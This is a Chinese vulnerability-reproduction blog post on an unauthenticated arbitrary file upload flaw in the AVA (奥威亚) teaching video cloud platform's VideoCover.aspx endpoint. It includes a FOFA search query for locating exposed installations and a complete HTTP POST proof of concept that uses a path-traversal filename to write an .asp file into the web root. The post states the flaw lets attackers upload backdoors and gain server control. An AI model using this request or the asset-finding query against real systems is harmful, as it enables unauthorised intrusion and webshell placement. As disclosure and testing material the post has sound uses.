#  漏洞复现 || 奥威亚视屏云平台VideoCover任意文件上传   
韩文庚  我爱林   2023-12-20 07:07  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
奥威亚教学视频应用云平台 VideoCover.aspx接口处存在任意文件上传漏洞，未经身份验证的攻击者可利用上传后门文件达到获取服务器权限效果。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlN19AX4QIJHCHYFzDUZ2N3K8ydjI9suamZENOX7gHGjCicqzr2dvFKibcJxNMej4g0b4PlJmGEUatUA/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa：body="/CSS/NewtonTheme/assets/app.css"
```  
## 漏洞复现  
  
  
1.  
利用如下POC进行POST请求上传文件  
```
POST /Tools/Video/VideoCover.aspx HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insectre-Requests: 1
Accept-Language: zh-CN,zh;g=0.9
Content-Length: 212
Content-Type: multipart/form-data; boundary=68c4ca658cd4332dc386f53710e63a10

--68c4ca658cd4332dc386f53710e63a10
Content-Disposition: form-data; name="file"; filename="/../../../AVA.ResourcesPlatform.WebUI/test1.asp"
Content-Type: image/jpeg

123
--68c4ca658cd4332dc386f53710e63a10--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlN19AX4QIJHCHYFzDUZ2N3KgIhHibUhYicvXtg8v1VDYnUOpiaMq7bHDZibmyfB8PhFpzMMIaKwBvhFwA/640?wx_fmt=png&from=appmsg "")  
  
2.访问上传成功的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlN19AX4QIJHCHYFzDUZ2N3KicVYO9wpo86TFlCVZMpX7ZDj98Yom9Qs4bzDkKOwOXSicK93zjNKr2sQ/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**点它，分享点赞在看都在这里**  
  
  
